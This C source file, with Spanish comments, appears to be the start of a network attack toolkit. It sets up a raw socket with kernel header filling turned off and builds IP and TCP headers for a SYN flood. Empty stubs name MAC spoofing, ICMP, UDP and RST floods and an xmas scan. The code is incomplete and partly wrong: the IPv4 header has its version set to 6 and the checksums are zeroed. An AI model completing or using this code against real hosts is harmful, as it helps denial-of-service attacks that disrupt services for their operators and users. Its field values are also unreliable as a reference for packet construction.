#include "ip-constructors.h"
#include "utils.c"
#include "macros.h"

void set_sockaddr_in(struct sockaddr_in* myaddr,char* source_address,char* source_port){
	myaddr->sin_family = AF_INET;
	myaddr->sin_port   = string_htons(source_port);
	myaddr->sin_addr.s_addr  = string_addr(source_address);
	memset(myaddr->sin_zero,0,8);
}

int get_socket_descriptor(){
	int fd = socket(PF_INET,SOCK_RAW,IPPROTO_TCP);
	if(fd==-1) fprintf(stderr,"Error creating socket.");
	return fd;
}
void set_ip_header(IP_HEADER* ip_hdr,char* source_address,char* remote_address){
	ip_hdr->version = 6;
	ip_hdr->ihl     = 5;
// Se podría establecer preferencia de tráfico con esto, pero está deprecated //
	ip_hdr->tos     = 0; 
 	ip_hdr->total_length = sizeof(IP_HEADER)+sizeof(TCP_HEADER);
	ip_hdr->identification = 0;
	ip_hdr->zero_flag = 0;
	ip_hdr->do_not_fragments = 0;
	ip_hdr->more_fragments   = 0;
	ip_hdr->fragment_offset  = 0;
	ip_hdr->ttl              = 64;
	ip_hdr->protocol         = 6; // TCP Protocol
	ip_hdr->checksum         = 0;
	ip_hdr->source_address   = string_addr(source_address);
	ip_hdr->remote_address   = string_addr(remote_address);
	ip_hdr->optional = 0;
}
void set_tcp_header_syn_flood(TCP_HEADER* tcp_hdr,char* source_port,char* remote_port,char* buffer){
	tcp_hdr->source_port  = string_htons(source_port);
	tcp_hdr->remote_port  = string_htons(remote_port);
	tcp_hdr->num_sequence = 1339;
	tcp_hdr->ack_number   = 0;
	tcp_hdr->offset       = 5;
	tcp_hdr->reserved     = 0;
	tcp_hdr->flag_reduced = 0;
	tcp_hdr->flag_echo    = 0;
	tcp_hdr->flag_urg     = 0;
	tcp_hdr->flag_ack     = 0;
	tcp_hdr->flag_push    = 0;
	tcp_hdr->flag_rst     = 0;
	tcp_hdr->flag_syn     = 1; // ;)
	tcp_hdr->flag_fin     = 0;
	tcp_hdr->window       = 65535;; // 2^16bits -> ventana de congestión = 16 bits
	tcp_hdr->checksum     = 0;//checksum((unsigned short*)buffer,(sizeof(IP_HEADER) + sizeof(TCP_HEADER)));
	tcp_hdr->urg_pointer  = 0;	
}

int kernel_not_fill_my_header(int socket){
    int val = 1;
    const int *pval = &val;
    return setsockopt(socket,IPPROTO_IP,IP_HDRINCL,pval,sizeof(val));
}

// El módulo actúa como factoria de funciones asociadas a los ataques/búsquedas EJ: //
// Se replicará código refactorizar cuando crezca :( //
void set_eth_frame_mac_spoofing(){}
void set_icmp_header_icmp_flood(){}
void set_udp_header_udp_flood(){}
void set_tcp_header_rst_attack(){}
void set_tcp_header_xmas_scan(){}
